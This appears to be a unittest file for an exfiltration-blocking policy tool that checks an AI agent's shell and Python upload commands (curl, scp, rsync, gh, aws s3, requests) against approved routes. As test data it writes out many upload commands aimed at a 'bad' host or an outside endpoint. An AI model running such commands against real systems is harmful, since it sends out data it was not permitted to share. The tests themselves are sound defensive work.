"""Common user uploads are inert text fixtures, with isolated hook storage."""
import unittest
from exfilbar.code import inspect_code
from exfilbar.parse import parse
from exfilbar.policy import Policy
from support import Context, admission_clock, entry


class UploadTests(unittest.TestCase):
    def test_common_uploads_keep_routes_through_shell_redirects(self):
        forms = (
            ('curl -fsS -F file=@reports/x https://{host}/up', 'https://good/up'),
            ('curl -Treports/x https://{host}/up', 'https://good/up'),
            ('curl --data-binary @reports/x https://{host}/up', 'https://good/up'),
            ('http --form POST https://{host}/up file@reports/x', 'https://good/up'),
            ('https -f POST https://{host}/up file@reports/x', 'https://good/up'),
            ('scp -q reports/x {host}:up', 'good:up'),
            ('rsync -vz --progress reports/x {host}:up', 'good:up'),
            ('gh release upload v1 reports/x --repo org/{host} --clobber', 'https://github.com/org/good'),
            ('gh release upload v1 reports/x#label -R github.com/org/{host}', 'https://github.com/org/good'),
            ('gh release upload v1 reports/x -R https://github.com/org/{host}', 'https://github.com/org/good'),
            ('aws s3 cp reports/x s3://{host}/up --only-show-errors', 's3://good/up'),
            ('aws --region us-east-1 s3 cp reports/x s3://{host}/up --no-progress', 's3://good/up'),
        )
        for form, target in forms:
            for host in ('good', 'bad'):
                base = form.format(host=host)
                for command in (base, base + ' 2>&1', '2>/dev/null ' + base, base + ' >/dev/null 2>&1'):
                    for unresolved in (True, False):
                        with self.subTest(command=command, unresolved=unresolved):
                            policy = Policy(routes=[dict(paths=['reports/**'], to=[target])], block_unresolved=unresolved)
                            transfers = parse(command)
                            self.assertTrue(transfers)
                            self.assertFalse(any(t.unresolved for t in transfers))
                            self.assertEqual(transfers[0].sources, ('reports/x',))
                            verdict = policy.evaluate(command)
                            self.assertEqual(verdict.blocked, host == 'bad')
                            self.assertTrue(verdict.route)

    def test_unknown_targets_options_and_file_redirects_fail_closed(self):
        for command in (
            'gh release upload v1 reports/x',
            'gh release upload v1 reports/x -R $REPO',
            'gh release upload v1 reports/x -R org/good --unknown',
            'aws s3 cp reports/x s3://good/up --recursive',
            'aws s3 cp reports/x s3://good/up --unknown',
            'aws s3 cp reports/x s3://good/up --endpoint-url https://elsewhere.example',
            'gh release upload v1 reports/x -R org/good >log',
            '>log aws s3 cp reports/x s3://good/up',
            'http --follow --form POST https://good/up file@reports/x',
            'curl -L -F file=@reports/x https://good/up',
        ):
            with self.subTest(command=command):
                self.assertTrue(Policy().evaluate(command).blocked)
        for command in ('gh release upload v1 private/x -R org/good',
                        'aws s3 cp private/x s3://good/up'):
            self.assertEqual(Policy(block_unresolved=False).evaluate(command).reason, 'protected path rule')

    def test_downloads_dryruns_and_unrelated_commands_are_controls(self):
        for command in ('gh release view v1', 'aws sts get-caller-identity',
                        'aws s3 cp s3://good/up reports/x',
                        'aws s3 cp s3://good/up s3://other/up',
                        'aws s3 cp reports/x s3://good/up --dryrun'):
            with self.subTest(command=command):
                self.assertEqual(parse(command), [])

    def test_multiple_files_and_registered_hook(self):
        plugin = entry()
        ctx = Context(routes=[dict(paths=['reports/**'], to=['https://github.com/org/good', 's3://good/*'])])
        plugin.register(ctx)
        with admission_clock(type(plugin.Ledger())):
            for command in ('gh release upload v1 reports/x reports/y -R org/good',
                            'aws s3 cp reports/x s3://good/up 2>&1'):
                self.assertIsNone(ctx.hooks['pre_tool_call']('terminal', {'command': command}, session_id='r3'))
            for command in ('gh release upload v1 reports/x reports/y -R org/bad',
                            'aws s3 cp reports/x s3://bad/up 2>&1'):
                result = ctx.hooks['pre_tool_call']('terminal', {'command': command}, session_id='r3')
                self.assertEqual(result['action'], 'block')
                self.assertIn('off route', result['message'])
        feed = plugin.Ledger().read('r3')
        self.assertEqual((feed['out'], feed['blocked']), (2, 2))

    def test_requests_route_controls_remain_static_code_only(self):
        for host in ('good', 'bad'):
            code = 'import requests; requests.post("https://' + host + '/up", files={"file": open("reports/x", "rb")})'
            policy = Policy(routes=[dict(paths=['reports/**'], to=['https://good/up'])])
            self.assertEqual(inspect_code(policy, code).blocked, host == 'bad')
